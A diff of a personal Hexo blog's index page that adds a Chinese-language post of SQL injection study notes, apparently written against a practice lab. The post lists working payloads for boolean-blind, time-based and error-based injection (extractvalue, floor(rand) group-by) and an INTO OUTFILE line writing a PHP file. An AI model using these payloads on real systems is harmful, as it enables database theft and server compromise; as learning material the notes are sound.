@@ -64,6 +64,44 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-sql2" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/11/28/sql2/" class="article-date">
+  <time datetime="2021-11-28T05:19:16.000Z" itemprop="datePublished">2021-11-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/11/28/sql2/">sql2</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>布尔盲注 他只会根据返回的 True 和 False，根据结果判断是否和自己输入的值一致从而猜解出完整的数据。<br>?id=1’ and (length(database())=n) –+ n为字符长度<br>database()是当前数据库名称<br>length(database())取出数据库名称的长度<br>&lt;  =  &gt; 分别为大于、等于、小于，用来判断是否满足条件。用来猜解。<br>我们已经知道数据库名称是 security 所以设定条件&lt;=8 都可以正常登录。<br>猜解 8 个字符的具体数值<br>?id=1 ‘ and(ascii(substr(database(),1,1))&gt;n) –+ n为ascii码<br>substr(database()1,1) 表示取出数据库名称的第一个字符，第一个1表示从第几个字符开始，第二个1表示取几个字符，我们猜解出一个值后就要把第一个值 +1 用来猜解第二个值<br> 时间盲注（倘若不报错）<br>1 ‘ and if(left(database(),1)=’s’, sleep(3), 1) –+  if语句（a真输出1，假则输出sleep）</p>
+<p>报错盲注<br>-1’ and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where%20 table_schema = database()))) –+<br>0’ union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)<em>2)) x from information_schema.tables group by x) fengzilin –+<br>0’union select 1,2,3 from (select count(</em>),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)fengzilin –+<br>sql写入<br>?id=-1’)) union select 1,2’fengzilin’ into outfile “/var/lib/mysql/fengzilin.php” –+</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://aomandetiankong.github.io/2021/11/28/sql2/" data-id="ckwit579k0005wwwb7oea71xu" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-sql学习1" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/11/22/sql%E5%AD%A6%E4%B9%A01/" class="article-date">
@@ -96,7 +134,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/11/22/sql%E5%AD%A6%E4%B9%A01/" data-id="ckwaryndi0006jgwbdw7771hk" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/11/22/sql%E5%AD%A6%E4%B9%A01/" data-id="ckwit579j0004wwwbc6qe7ihn" class="article-share-link">Share</a>
       
       
     </footer>
@@ -134,7 +172,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/11/03/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A03%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/" data-id="ckwaryndm0009jgwb76r3dusz" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/11/03/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A03%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/" data-id="ckwit579m000awwwb2wxf7co2" class="article-share-link">Share</a>
       
       
     </footer>
@@ -172,7 +210,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/10/27/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A02%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/" data-id="ckwaryndm0008jgwb1wz8aw6u" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/10/27/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A02%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E9%97%AE%E9%A2%98%EF%BC%89/" data-id="ckwit579m0009wwwbemot95ou" class="article-share-link">Share</a>
       
       
     </footer>
@@ -209,7 +247,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/10/21/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A01%EF%BC%88%E7%99%BB%E5%BD%95%E6%A1%86%E9%97%AE%E9%A2%98%EF%BC%89/" data-id="ckwaryndi0007jgwbcj7x4jlg" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/10/21/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A01%EF%BC%88%E7%99%BB%E5%BD%95%E6%A1%86%E9%97%AE%E9%A2%98%EF%BC%89/" data-id="ckwit579l0008wwwb0hv8bsap" class="article-share-link">Share</a>
       
       
     </footer>
@@ -247,7 +285,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/09/29/%E6%8C%87%E9%92%88%EF%BC%8C%E7%BB%93%E6%9E%84%E4%B8%8E%E5%87%BD%E6%95%B0/" data-id="ckwaryndh0004jgwbabwfg3i7" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/09/29/%E6%8C%87%E9%92%88%EF%BC%8C%E7%BB%93%E6%9E%84%E4%B8%8E%E5%87%BD%E6%95%B0/" data-id="ckwit579k0006wwwbfsrzccxx" class="article-share-link">Share</a>
       
       
     </footer>
@@ -285,7 +323,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/09/24/%E6%B1%82%E6%95%B0%E7%BB%84%E4%BD%8D%E6%95%B0%E7%9A%84%E6%96%B9%E6%B3%95/" data-id="ckwaryndh0005jgwbf1q720p0" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/09/24/%E6%B1%82%E6%95%B0%E7%BB%84%E4%BD%8D%E6%95%B0%E7%9A%84%E6%96%B9%E6%B3%95/" data-id="ckwit579l0007wwwb0esyceul" class="article-share-link">Share</a>
       
       
     </footer>
@@ -323,7 +361,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/09/18/newpapername/" data-id="ckwaryndf0002jgwbb89q8iw6" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/09/18/newpapername/" data-id="ckwit579g0001wwwb9r2ua7w9" class="article-share-link">Share</a>
       
       
     </footer>
@@ -359,7 +397,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/" data-id="ckwaryndg0003jgwbgt2nbsn5" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/" data-id="ckwit579h0002wwwbfr1l9zi7" class="article-share-link">Share</a>
       
       
     </footer>
@@ -395,56 +433,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/09/18/My/" data-id="ckwarynde0001jgwb8u826a3z" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2021/09/18/hello-world/" class="article-date">
-  <time datetime="2021-09-17T16:24:26.958Z" itemprop="datePublished">2021-09-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/18/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://aomandetiankong.github.io/2021/09/18/hello-world/" data-id="ckwarynda0000jgwb2w7ha6iy" class="article-share-link">Share</a>
+      <a data-url="https://aomandetiankong.github.io/2021/09/18/My/" data-id="ckwit579c0000wwwbdw87g6hb" class="article-share-link">Share</a>
       
       
     </footer>
@@ -455,6 +444,11 @@
 
   
 
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+  </nav>
 
 </section>
         
@@ -485,6 +479,10 @@
       <ul>
         
           <li>
+            <a href="/2021/11/28/sql2/">sql2</a>
+          </li>
+        
+          <li>
             <a href="/2021/11/22/sql%E5%AD%A6%E4%B9%A01/">sql学习1</a>
           </li>
         
@@ -498,10 +496,6 @@
         
           <li>
             <a href="/2021/10/21/%E9%BB%91%E7%9B%BE%E6%9D%AF%E5%AD%A6%E4%B9%A01%EF%BC%88%E7%99%BB%E5%BD%95%E6%A1%86%E9%97%AE%E9%A2%98%EF%BC%89/">黑盾杯学习1（登录框问题）</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/29/%E6%8C%87%E9%92%88%EF%BC%8C%E7%BB%93%E6%9E%84%E4%B8%8E%E5%87%BD%E6%95%B0/">指针，结构与函数</a>
           </li>
         
       </ul>
